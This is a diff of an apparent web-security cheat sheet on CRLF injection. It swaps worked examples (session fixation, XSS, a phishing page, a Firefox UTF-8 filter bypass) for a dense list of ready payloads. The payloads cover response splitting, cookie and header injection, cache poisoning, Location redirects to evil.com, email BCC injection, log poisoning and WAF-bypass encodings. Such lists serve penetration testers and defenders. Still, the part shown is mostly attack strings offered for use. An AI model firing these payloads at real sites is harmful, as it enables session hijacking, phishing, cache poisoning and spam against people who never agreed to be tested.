@@ -1663,154 +1663,97 @@ By injecting a CRLF sequence, the attacker can break the response into two parts
 * Cache Poisoning: Forcing incorrect content to be stored in caches.
 * Header Manipulation: Altering headers to mislead users or systems
 
-### Session Fixation
+# 🔹 Basic CRLF Injection Payloads
 
-A typical HTTP response header looks like this:
+* New header injection:  %0d%0aX-Test: injected → Adds a new HTTP header.
+* Response splitting:  %0d%0a%0d%0a<h1>Injected</h1> → Starts a new HTTP response body.
+* Header overwrite:  %0d%0aContent-Type: text/html → Changes response content type.
+* Cookie injection:  %0d%0aSet-Cookie: admin=true → Sets arbitrary cookie.
+* Location header injection:  %0d%0aLocation: https://evil.com → Forces redirect.
 
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Set-Cookie: sessionid=abc123
-```
+# 🔹 HTTP Response Splitting
 
-If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:
+* Full response injection:  %0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Owned</h1>  → Creates second response.
+* HTML injection via response:  %0d%0a%0d%0a<script>alert(1)</script> → Injects content into browser.
+* Cache poisoning response:  %0d%0a%0d%0a<html>Cached Evil</html>  → Stored by proxy/CDN.
 
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Set-Cookie: sessionid=value
-Set-Cookie: admin=true
-```
+# 🔹 Header Injection Attacks
 
-Now the attacker has set their own cookie.
+* Inject custom header:  %0d%0aX-Forwarded-For: 127.0.0.1
+* Inject Host header:  %0d%0aHost: evil.com
+* Inject Authorization header:  %0d%0aAuthorization: Bearer evil
+* Inject Content-Length:  %0d%0aContent-Length: 0
+* Inject CORS header:  %0d%0aAccess-Control-Allow-Origin: *
 
-### Cross Site Scripting
+# 🔹 Cookie Manipulation
 
-Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).
+* Set arbitrary cookie:  %0d%0aSet-Cookie: session=attacker
+* Privilege escalation cookie:  %0d%0aSet-Cookie: role=admin
+* Cookie overwrite:  %0d%0aSet-Cookie: session=admin; path=/
+* Persistent cookie:  %0d%0aSet-Cookie: admin=true; HttpOnly
 
-**Requested page**:
+# 🔹 Redirect & Location Injection
 
-```http
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
-```
-```
-http://www.example.net/index.php?lang=en
-Content-Length: 0
- 
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
- 
-<html>You have been Phished</html>
-```
+* Open redirect:  %0d%0aLocation: https://evil.com
+* Header + redirect:  %0d%0aSet-Cookie: admin=true%0d%0aLocation: https://evil.com
+* Relative redirect:  %0d%0aLocation: //evil.com
 
-**HTTP response**:
+# 🔹 Log Injection (Log Poisoning)
 
-```http
-Set-Cookie:en
-Content-Length: 0
+* Inject into logs:  %0d%0aINFO: User logged in as admin
+* Multi-line log injection: %0d%0aERROR: Failed login%0d%0aINFO: Admin login
+* Log-based XSS:  %0d%0a<script>alert(1)</script>
 
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
+# 🔹 Cache Poisoning via CRLF
 
-<html>You have been Phished</html>
-```
+* Inject cacheable response:  %0d%0aCache-Control: public, max-age=3600
+* Poison CDN cache:  %0d%0a%0d%0a<html>Evil Cached Page</html>
+* Modify Vary header:  %0d%0aVary: User-Agent
 
-In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .
+# 🔹 Email Header Injection
 
-**Requested page**:
+* Inject BCC header:  %0d%0aBcc: attacker@evil.com
+* Inject CC header:  %0d%0aCc: attacker@evil.com
+* Subject manipulation:  %0d%0aSubject: Hacked
+* Multi-recipient injection:  %0d%0aTo: victim@target.com, attacker@evil.com
 
-```powershell
-http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
-```
-```
-http://example.com/
-Content-Length:35
-X-XSS-Protection:0
+# 🔹 WAF Bypass Techniques (CRLF)
 
-23
-<svg onload=alert(document.domain)>
-0
-//..
-```
-**HTTP Response**:
+## 🧩 Encoding Tricks
 
-```http
-HTTP/1.1 200 OK
-Date: Tue, 20 Dec 2016 14:34:03 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 22907
-Connection: close
-X-Frame-Options: SAMEORIGIN
-Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
-ETag: "842fe-597b-54415a5c97a80"
-Vary: Accept-Encoding
-X-UA-Compatible: IE=edge
-Server: NetDNA-cache/2.2
-Link: https://example.com/[INJECTION STARTS HERE]
-Content-Length:35
-X-XSS-Protection:0
+* URL encoding:  %0d%0a → Standard CRLF
+* Double encoding:  %250d%250a → Decoded twice
+* Mixed encoding:  %0D%0A → Case variation
+* Partial encoding:  %0d\n
 
-23
-<svg onload=alert(document.domain)>
-0
-```
+## 🧩 Obfuscation Techniques
 
-### Open Redirect
+* Insert spaces:  %0d%0a X-Test: injected
+* Tab injection:  %0d%0a%09X-Test: injected
+* Multiple CRLF:  %0d%0a%0d%0a%0d%0a
+* Null byte injection:  %0d%0a%00X-Test: injected
 
-Inject a `Location` header to force a redirect for the user.
+## 🧩 Header Parsing Tricks
 
-```ps1
-%0d%0aLocation:%20http://myweb.com
-```
+* Duplicate headers:  %0d%0aSet-Cookie: user=guest%0d%0aSet-Cookie: user=admin
+* Header overwrite race:  %0d%0aContent-Type: text/plain%0d%0aContent-Type: text/html
+* Merge headers:  %0d%0aX-Test: a%0d%0aX-Test: b
 
-## Filter Bypass
+## 🧩 Filter Bypass Variants
 
-[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.
+* Alternate line breaks:  %0a (LF only) or %0d (CR only)
+* Unicode encoding:  %u000d%u000a
+* Raw newline injection:  \r\nX-Test: injected
 
-> Newly defined header fields SHOULD limit their field values to US-ASCII octets.
+# 🔹 Real-World Attack Scenarios
 
-Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.
+* Session fixation:  Inject Set-Cookie: session=attacker → Hijack session.
+* Cache poisoning:  Inject malicious HTML → Cached by CDN → served to users.
+* Open redirect:  Inject Location header → redirect victims.
+* Email abuse:  Inject BCC → send spam via application.
+* Security bypass:  Inject headers like X-Forwarded-For: 127.0.0.1
 
-| UTF-8 Character | Hex | Unicode | Stripped |
-| --------- | --- | ------- | -------- |
-| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
-| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
-| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
-| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |
-
-The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.
-
-An example payload using UTF-8 characters would be:
-
-```js
-嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
-```
-
-URL encoded version
-
-```js
-%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
-```
-
-### Exploitation Examples:
-#### Add a Cookie:
-```
-http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
-```
-#### Bypass XSS Protection:
-```
-http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
-```
-#### Write HTML Response:
-```
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
-```
-
-## 3. Server-Side Request Forgery (SSRF)
+3. Server-Side Request Forgery (SSRF)
 
 ### Exploitation Techniques:
 1. Abuse trust:
